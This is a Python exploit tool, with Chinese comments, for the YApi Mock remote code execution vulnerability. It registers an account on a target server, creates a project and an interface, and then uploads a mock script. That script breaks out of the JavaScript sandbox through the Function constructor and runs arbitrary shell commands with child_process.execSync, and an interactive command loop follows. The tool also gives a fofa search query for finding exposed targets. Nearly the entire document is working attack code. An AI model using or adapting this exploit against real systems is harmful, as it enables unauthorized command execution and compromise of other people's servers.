import argparse
import json
import random
import string
import sys

import requests
import urllib3

urllib3.disable_warnings()

header = {
    'Accept': 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Content-Type': 'application/json;charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
}

session = requests.session()

def Generate_Random_String(min_length=8, max_length=12):
    characters = string.ascii_letters + string.digits
    length = random.randint(min_length, max_length)
    random_string = ''.join(random.choice(characters) for i in range(length))
    return random_string

# 使用随机项目名
project = Generate_Random_String()

def title():
    print(r'''%s
 __    __  ______
/\ \  /\ \/\  _  \          __
\ `\`\\/'/\ \ \L\ \  _____ /\_\
 `\ `\ /'  \ \  __ \/\ '__`\/\ \
   `\ \ \   \ \ \/\ \ \ \L\ \ \ \
     \ \_\   \ \_\ \_\ \ ,__/\ \_\
      \/_/    \/_/\/_/\ \ \/  \/_/
                       \ \_\
      by hony 20210711  \/_/
      python3 %s -u http://127.0.0.1:3000 %s''' % ('\033[1;31m', sys.argv[0], '\033[0m'))





def help():
    global args
    global url
    global uname
    global email
    global passwd
    global cmd

    description = f'''
    \033[1;31mYApi Mock 远程代码执行漏洞利用工具     by hony 20210711\033[0m

    fofa语法: app="YApi"'''
    parser = argparse.ArgumentParser(prog=f'python3 {sys.argv[0]}',
                                     description=description,
                                     formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-u', '--url', dest='url', help='目标URL', required=True)
    parser.add_argument('--uname', metavar='uname', dest='uname', default=Generate_Random_String(), help='指定用户名')
    parser.add_argument('--passwd', metavar='passwd', dest='passwd', default=Generate_Random_String(), help='指定密码')
    parser.add_argument('--email', metavar='email', dest='email', default=Generate_Random_String() + '@gmail.com', help='指定邮箱')
    parser.add_argument('--cmd', metavar='cmd', dest='cmd', default='whoami', help='指定命令')

    args = parser.parse_args()
    url = args.url
    uname = args.uname
    passwd = args.passwd
    email = args.email
    cmd = args.cmd


def Create_User():
    try:
        data = '{' + \
               f'"email": "{email}",' \
               f'"password": "{passwd}",' \
               f'"username": "{uname}"' \
               + '}'
        path = '/api/user/reg'
        res = requests.post(url=url + path, headers=header, data=data, verify=False, timeout=5)
        # print(res.text)
        if '成功' in res.text:
            print(f'\033[1;32m【+】User register Success! User:{uname} Password:{passwd} Email:{email}\033[0m')
        elif '401' in res.text:
            print(f'\033[1;32m【*】Email also Resigter!    Email: {email}\033[0m')
        elif '40011' in res.text:
            print(f'\033[0;31m【-】目标服务器出错...\033[0m')
            exit()
        elif '禁止注册' in res.text:
            print(f'\033[1;31m【-】{url} 禁止注册!\033[0m')
            exit()
        else:
            print('\033[0;33m【-】User register Error!\033[0m')
            print(f'\033[0;33m【-】可能是请求的URL中有错误,注意/的原因: {res.url}\033[0m')
            print(f'响应体: {res.text}')  # 遇见过响应体写了，只支持公司邮箱的；如果响应体是Not Found，是URL中多打了个 / 的原因
            exit()

    except Exception as e:
        print('\033[0;31m【-】NetWork Error\033[0m', e)
        exit()


def Login():
    # 获取用户 uid 和登录的 session
    global uid

    data = '{' + \
           f'"email":"{email}",' \
           f'"password":"{passwd}"' \
           + '}'
    path = '/api/user/login'
    try:
        res = session.post(url=url + path, headers=header, data=data, verify=False, timeout=5)
        # print(res.text)
        id = json.loads(res.text)
        uid = id['data']['uid']
        # print('uid: ' + str(uid))
        if 'logout success...' in res.text:
            print('\033[1;32m【+】Login Success...\033[0m')
        else:
            print('\033[0;33m【-】Other Error\033[0m')
    except Exception as e:
        if '密码错误' in res.text:
            print('\033[0;33m【-】Password Error\033[0m')
            exit()
        print('\033[0;31m【-】Network Error\033[0m', e)
        exit()


def Get_Project_id():
    # 这一步是为了获取，创建项目所需的 group_id
    global group_id

    path = '/api/group/get_mygroup'
    try:
        res = session.get(url=url + path, headers=header, verify=False, timeout=5)
        group_dict = json.loads(res.text)
        group_id = group_dict['data']['_id']
        # print(res.text)
        print(f'\033[1;32m【+】group_id: {str(group_id)}\033[0m')

    except Exception as e:
        print('\033[0;31m【-】NetWork Error\033[0m', e)
        exit()


def Create_Project():
    # 创建项目需要 group_id
    # 这一步是为了获取 project_id
    global project_id

    path = '/api/project/add'
    data = '{' + \
           f'"name":"{project}",' \
           f'"basepath":"",' \
           f'"group_id":"{str(group_id)}",' \
           f'"icon":"code-o",' \
           f'"color":"pink",' \
           f'"project_type":"private"' \
           + '}'
    try:
        res = session.post(url=url + path, data=data, headers=header, verify=False, timeout=5)
        Inter_dict = json.loads(res.text)

        try:
            project_id = str(Inter_dict['data']['_id'])
            if '成功！' in res.text:
                print(f'\033[1;32m【+】Project Create Success... project_id: {str(project_id)}\033[0m')
        except Exception as e:
            print('\033[0;31m【-】NetWork Error\033[0m', e)
            if '401' in res.text:
                print('【-】The project already exists...')
            elif '405' in res.text:
                print('【-】No permissions, try changing group_id')
            exit()
    except Exception as e:
        print('\033[0;31m【-】NetWork Error\033[0m', e)
        exit()


def Create_Interface():
    path = '/api/interface/add'
    data = '{' + \
           f'"method":"GET",' \
           f'"catid":"727",' \
           f'"title":"{uname}",' \
           f'"path":"/{uname}",' \
           f'"project_id":"{project_id}"' \
           + '}'
    # title 是创建接口的名字，path 是访问接口的路径，project_id 是这个项目的 id 号
    # catid 的值随意，必须为数字
    try:
        res = session.post(url=url + path, headers=header, data=data, verify=False, timeout=5)
        # print(res.text)
        if '成功！' in res.text:
            print('\033[1;32m【+】Interface Create Success...\033[0m')
        elif '40022' in res.text:
            print('【-】Interface already exists...')
        elif '40033' in res.text:
            print('【-】No permissions, try changing catid...')
        else:
            print('【-】interfaceOther Error')
    except Exception as e:
        print('\033[0;31m【-】NetWork Error\033[0m', e)
        exit()


def Mock(cmd):
    global target_url
    path = '/api/project/up'
    # 这里使用全局 Mock 脚本，就不需要 interface_id 了
    # 如果在单个接口中，添加脚本，还需要 "interface_id":"1261", 请求路径也不一样，麻烦
    data = '{' + \
           f'"id":{project_id},' \
           f'''"project_mock_script":"const sandbox = this\\nconst ObjectConstructor = this.constructor\\nconst FunctionConstructor = ObjectConstructor.constructor\\nconst myfun = FunctionConstructor('return process')\\nconst process = myfun()\\nmockJson = process.mainModule.require(\\"child_process\\").execSync(\\"{cmd}\\").toString()",''' \
           f'"is_mock_open":true' \
           + '}'
    # id 为项目的id号
    # cmd 为执行的命令

    try:
        res = session.post(url=url + path, headers=header, data=data, verify=False, timeout=8)
        # 命令执行,返回的结果
        target_url = url + "/mock/" + project_id + '/' + uname
        result_url = session.get(url=target_url, headers=header, verify=False, timeout=8)
        print(result_url.text)
    except Exception as e:
        print('\033[0;31m【-】NetWork Error\033[0m', e)


if __name__ == '__main__':
    if len(sys.argv) == 1:
        title()
    else:
        help()
        title()
        Create_User()
        Login()
        Get_Project_id()
        Create_Project()
        Create_Interface()
        Mock(cmd)
        # print(target_url)
        # 输出显示命令结果地址
        while 1:
            cmd = input("\033[1;31mCommand >>>\033[0m")
            if (cmd == 'exit') or (cmd == 'quit'):
                break
            else:
                Mock(cmd)
